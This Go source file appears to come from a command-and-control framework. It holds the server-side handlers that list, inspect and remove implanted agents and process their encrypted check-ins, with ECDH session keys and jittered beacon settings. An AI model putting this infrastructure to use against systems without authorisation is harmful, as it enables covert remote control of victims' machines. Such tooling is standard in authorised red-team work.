package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/mjopsec/taburtuaiC2/internal/services"
	"github.com/mjopsec/taburtuaiC2/pkg/crypto"
)

// ListAgents returns all registered agents
func (h *Handlers) ListAgents(c *gin.Context) {
	agents := h.server.Monitor.GetAllAgents()

	var agentList []map[string]any
	for _, agent := range agents {
		agentList = append(agentList, map[string]any{
			"id":        agent.ID,
			"hostname":  agent.Hostname,
			"username":  agent.Username,
			"os":        agent.OS,
			"status":    agent.Status,
			"last_seen": agent.LastSeen,
		})
	}

	h.APIResponse(c, true, "", map[string]any{
		"agents": agentList,
		"total":  len(agentList),
	}, "")
}

// GetAgent returns specific agent details
func (h *Handlers) GetAgent(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	h.APIResponse(c, true, "", agent, "")
}

// RemoveAgent removes an agent
func (h *Handlers) RemoveAgent(c *gin.Context) {
	agentID := c.Param("id")
	h.server.Monitor.RemoveAgent(agentID)
	h.APIResponse(c, true, fmt.Sprintf("Agent %s removed", agentID), nil, "")
}

// AgentCheckin handles agent check-in with optional ECDH key exchange.
//
// ECDH flow:
//  1. Agent sends its ephemeral P-256 public key as "ecdh_pub" (base64)
//  2. Server generates its own ephemeral key pair, derives the shared AES key,
//     stores it in the agent's metadata, and returns its public key
//  3. Both sides now share the same AES-256 session key for subsequent traffic
func (h *Handlers) AgentCheckin(c *gin.Context) {
	var checkinData map[string]any
	if err := c.ShouldBindJSON(&checkinData); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid checkin data: "+err.Error())
		return
	}

	// Decrypt if payload is wrapped
	if enc, ok := checkinData["encrypted_payload"].(string); ok && h.server.CryptoMgr != nil {
		decrypted, err := h.server.CryptoMgr.DecryptData(enc)
		if err != nil {
			h.server.Logger.Error(services.SYSTEM, "Failed to decrypt checkin: "+err.Error(), "", "", nil)
			c.Status(http.StatusBadRequest)
			h.APIResponse(c, false, "", nil, "Failed to decrypt checkin data")
			return
		}
		var plain map[string]any
		if err := json.Unmarshal(decrypted, &plain); err != nil {
			c.Status(http.StatusBadRequest)
			h.APIResponse(c, false, "", nil, "Failed to parse decrypted data")
			return
		}
		checkinData = plain
	}

	// ── ECDH key exchange ─────────────────────────────────────────────────────
	var serverECDHPub string
	if agentPubB64, ok := checkinData["ecdh_pub"].(string); ok && agentPubB64 != "" {
		session, err := crypto.NewECDHSession()
		if err == nil {
			sessionKey, err := session.DeriveSessionKey(agentPubB64)
			if err == nil {
				serverECDHPub = session.PubKeyB64
				// Persist session key in agent metadata so subsequent requests can use it
				checkinData["_session_key"] = base64.StdEncoding.EncodeToString(sessionKey)
			} else {
				h.server.Logger.Warn(services.SYSTEM, "ECDH derive failed: "+err.Error(), "", "", nil)
			}
		} else {
			h.server.Logger.Warn(services.SYSTEM, "ECDH session create failed: "+err.Error(), "", "", nil)
		}
		// Remove the public key from checkin data so it isn't stored as agent field
		delete(checkinData, "ecdh_pub")
	}

	// Register / update agent
	if err := h.server.Monitor.RegisterAgent(checkinData); err != nil {
		h.server.Logger.Error(services.SYSTEM, "RegisterAgent failed: "+err.Error(), "", "", nil)
	}

	agentID, _ := checkinData["id"].(string)
	hostname, _ := checkinData["hostname"].(string)
	h.server.Logger.LogAgentConnection(agentID, "checkin", c.ClientIP())

	// Broadcast checkin event to all connected operators
	h.server.TeamHub.Broadcast(services.TeamEvent{
		Type:    "agent_checkin",
		AgentID: agentID,
		Payload: fmt.Sprintf("%s checked in from %s", hostname, c.ClientIP()),
		Time:    time.Now().Format(time.RFC3339),
	})

	response := map[string]any{
		"status": "ok",
		"config": map[string]any{
			"interval": 30,
			"jitter":   0.3,
		},
	}
	if serverECDHPub != "" {
		response["ecdh_pub"] = serverECDHPub
	}

	h.APIResponse(c, true, "Checkin successful", response, "")
}
